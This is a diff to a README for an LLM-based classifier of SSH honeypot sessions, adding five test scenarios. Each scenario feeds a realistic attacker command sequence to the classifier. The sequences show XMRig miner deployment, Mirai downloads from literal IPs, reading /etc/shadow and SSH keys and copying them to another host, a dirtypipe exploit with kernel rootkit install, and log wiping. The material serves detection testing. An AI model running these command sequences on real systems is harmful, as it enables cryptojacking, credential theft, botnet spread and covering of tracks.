@@ -64,40 +64,210 @@ python3 llm_classifier.py
 > [!NOTE]
 > Scores are determined dynamically by the LLM — exact values vary between runs, but relative ordering should hold (Ransomware > Data Exfil > Brute Force > Recon).
 
-### Test per-command LLM scoring
+### Real-World Attack Sequence Tests
 
-```python
+These simulate actual attacker behavior captured in production SSH honeypots. Each test feeds a realistic command sequence to the LLM and prints per-command scores + full session classification.
+
+#### Scenario 1 — Cryptominer Deployment (XMRig)
+
+A very common real-world attack. Attacker gains SSH access, kills competing miners, downloads and runs XMRig.
+
+```bash
 python3 -c "
-from llm_classifier import rule_based_score
+from llm_classifier import classify_with_llm, rule_based_score
 
-# The LLM analyzes each command dynamically — no static keyword lists
-for cmd in ['ls', 'whoami', 'cat /etc/passwd', 'wget http://evil.com/malware.sh', 'chmod +x malware.sh']:
+commands = [
+    'uname -a',
+    'cat /proc/cpuinfo | grep -c processor',
+    'free -m',
+    'ps aux | grep -i mine',
+    'kill -9 \$(pgrep -f kinsing)',
+    'kill -9 \$(pgrep -f kdevtmpfsi)',
+    'cd /tmp && curl -O http://pool.supportxmr.com/xmrig-6.21.0-linux-x64.tar.gz',
+    'tar -xzf xmrig-6.21.0-linux-x64.tar.gz',
+    'nohup ./xmrig -o pool.supportxmr.com:3333 -u 49aYSE... -p x --threads=\$(nproc) &',
+    'echo \"@reboot /tmp/xmrig -o pool.supportxmr.com:3333\" | crontab -',
+    'history -c && rm -f ~/.bash_history'
+]
+
+print('=== PER-COMMAND LLM SCORES ===')
+for cmd in commands:
     score = rule_based_score(cmd)
-    print(f'{cmd:45s} -> {score:.0%}')
+    print(f'  {score:.0%}  {cmd[:80]}')
 
-# Scores should increase from harmless to critical
-print('\nVerify: ls < whoami < cat /etc/passwd < wget < chmod +x')
+print('\n=== FULL SESSION CLASSIFICATION ===')
+result = classify_with_llm(commands)
+print(f'Attack Type:    {result[\"attack_type\"]}')
+print(f'Threat Score:   {result[\"threat_score\"]:.0%}')
+print(f'Confidence:     {result[\"confidence\"]}')
+print(f'Reasoning:      {result[\"reasoning\"]}')
+print(f'Predicted Next: {result[\"predicted_next\"]}')
 "
 ```
 
-### Test with session intel (Cowrie enrichment context)
+#### Scenario 2 — Mirai-Style IoT Botnet Recruitment
 
-```python
+Attacker scans for other vulnerable devices, downloads Mirai variant, spreads laterally.
+
+```bash
 python3 -c "
-from llm_classifier import classify_with_llm
+from llm_classifier import classify_with_llm, rule_based_score
 
+commands = [
+    'cat /proc/version',
+    'cat /etc/issue',
+    'cd /tmp || cd /var/run || cd /mnt',
+    'wget http://185.62.190.45/bins/mirai.x86 -O dvrHelper',
+    'chmod 777 dvrHelper',
+    './dvrHelper',
+    'busybox wget http://185.62.190.45/bins/mirai.arm -O dvrHelper',
+    'rm -rf /tmp/* /var/log/*',
+    '/bin/busybox echo -e \"\x47\x72\x6f\x75\x70\"'
+]
+
+print('=== PER-COMMAND LLM SCORES ===')
+for cmd in commands:
+    score = rule_based_score(cmd)
+    print(f'  {score:.0%}  {cmd[:80]}')
+
+print('\n=== FULL SESSION CLASSIFICATION ===')
+result = classify_with_llm(commands)
+print(f'Attack Type:    {result[\"attack_type\"]}')
+print(f'Threat Score:   {result[\"threat_score\"]:.0%}')
+print(f'Confidence:     {result[\"confidence\"]}')
+print(f'Reasoning:      {result[\"reasoning\"]}')
+print(f'Predicted Next: {result[\"predicted_next\"]}')
+"
+```
+
+#### Scenario 3 — SSH Lateral Movement & Credential Theft
+
+Attacker harvests credentials and SSH keys, then pivots to other hosts on the network.
+
+```bash
+python3 -c "
+from llm_classifier import classify_with_llm, rule_based_score
+
+commands = [
+    'whoami',
+    'id',
+    'cat /etc/passwd',
+    'cat /etc/shadow',
+    'find / -name id_rsa 2>/dev/null',
+    'find / -name authorized_keys 2>/dev/null',
+    'cat /root/.ssh/id_rsa',
+    'cat /root/.ssh/known_hosts',
+    'arp -a',
+    'for i in \$(seq 1 254); do ping -c1 -W1 192.168.1.\$i; done',
+    'ssh -o StrictHostKeyChecking=no root@192.168.1.10',
+    'scp /etc/shadow root@192.168.1.10:/tmp/'
+]
+
+print('=== PER-COMMAND LLM SCORES ===')
+for cmd in commands:
+    score = rule_based_score(cmd)
+    print(f'  {score:.0%}  {cmd[:80]}')
+
+print('\n=== FULL SESSION CLASSIFICATION ===')
 intel = '''ADDITIONAL COWRIE SESSION INTELLIGENCE:
-- SSH client version: SSH-2.0-libssh2_1.9.0
-- HASSH fingerprint: abc123def456
+- SSH client version: SSH-2.0-OpenSSH_7.4
+- HASSH fingerprint: 92674389fa1e47a27ddd8e6b3d0f8222
 - Authentication activity:
-  . cowrie.login.failed user=root success=False
-  . cowrie.login.success user=root success=True
-- Dwell time (seconds): 45.30'''
+  . cowrie.login.failed user=admin success=False password=a...[REDACTED] (len 5)
+  . cowrie.login.failed user=root success=False password=1...[REDACTED] (len 6)
+  . cowrie.login.failed user=root success=False password=t...[REDACTED] (len 4)
+  . cowrie.login.success user=root success=True password=r...[REDACTED] (len 4)
+- Dwell time (seconds): 187.40'''
 
-result = classify_with_llm(['whoami', 'uname -a', 'cat /etc/passwd'], intel)
-print(f'Type: {result[\"attack_type\"]}')
-print(f'Score: {result[\"threat_score\"]:.0%}')
-print(f'Reasoning: {result[\"reasoning\"]}')
+result = classify_with_llm(commands, intel)
+print(f'Attack Type:    {result[\"attack_type\"]}')
+print(f'Threat Score:   {result[\"threat_score\"]:.0%}')
+print(f'Confidence:     {result[\"confidence\"]}')
+print(f'Reasoning:      {result[\"reasoning\"]}')
+print(f'Predicted Next: {result[\"predicted_next\"]}')
+"
+```
+
+#### Scenario 4 — Linux Privilege Escalation & Rootkit
+
+Attacker checks kernel version, exploits known vuln, installs rootkit for persistence.
+
+```bash
+python3 -c "
+from llm_classifier import classify_with_llm, rule_based_score
+
+commands = [
+    'uname -r',
+    'cat /etc/os-release',
+    'sudo -l',
+    'find / -perm -4000 -type f 2>/dev/null',
+    'getcap -r / 2>/dev/null',
+    'curl http://205.185.113.80/dirtypipe -o /tmp/exploit',
+    'chmod +x /tmp/exploit',
+    '/tmp/exploit',
+    'id',
+    'mkdir -p /lib/modules/\$(uname -r)/kernel/drivers/misc',
+    'wget http://205.185.113.80/rootkit.ko -O /lib/modules/\$(uname -r)/kernel/drivers/misc/sysmod.ko',
+    'insmod /lib/modules/\$(uname -r)/kernel/drivers/misc/sysmod.ko',
+    'echo sysmod >> /etc/modules',
+    'rm -f /tmp/exploit /var/log/auth.log'
+]
+
+print('=== PER-COMMAND LLM SCORES ===')
+for cmd in commands:
+    score = rule_based_score(cmd)
+    print(f'  {score:.0%}  {cmd[:80]}')
+
+print('\n=== FULL SESSION CLASSIFICATION ===')
+result = classify_with_llm(commands)
+print(f'Attack Type:    {result[\"attack_type\"]}')
+print(f'Threat Score:   {result[\"threat_score\"]:.0%}')
+print(f'Confidence:     {result[\"confidence\"]}')
+print(f'Reasoning:      {result[\"reasoning\"]}')
+print(f'Predicted Next: {result[\"predicted_next\"]}')
+"
+```
+
+#### Scenario 5 — Slow & Stealthy Recon (APT-style)
+
+A careful attacker doing quiet reconnaissance — no malware, just information gathering. Should score lower but still suspicious.
+
+```bash
+python3 -c "
+from llm_classifier import classify_with_llm, rule_based_score
+
+commands = [
+    'w',
+    'last -5',
+    'ls -la /var/log/',
+    'cat /etc/hostname',
+    'ip addr show',
+    'ss -tulnp',
+    'df -h',
+    'crontab -l',
+    'ls -la /opt /srv /var/www',
+    'env'
+]
+
+print('=== PER-COMMAND LLM SCORES ===')
+for cmd in commands:
+    score = rule_based_score(cmd)
+    print(f'  {score:.0%}  {cmd[:80]}')
+
+print('\n=== FULL SESSION CLASSIFICATION ===')
+intel = '''ADDITIONAL COWRIE SESSION INTELLIGENCE:
+- SSH client version: SSH-2.0-OpenSSH_9.3p1 Ubuntu-1ubuntu3
+- HASSH fingerprint: ec7378c1a92f5a8dde7e8b7a1ddf33d1
+- Authentication activity:
+  . cowrie.login.success user=deploy success=True password=d...[REDACTED] (len 8)
+- Dwell time (seconds): 312.60'''
+
+result = classify_with_llm(commands, intel)
+print(f'Attack Type:    {result[\"attack_type\"]}')
+print(f'Threat Score:   {result[\"threat_score\"]:.0%}')
+print(f'Confidence:     {result[\"confidence\"]}')
+print(f'Reasoning:      {result[\"reasoning\"]}')
+print(f'Predicted Next: {result[\"predicted_next\"]}')
 "
 ```
 
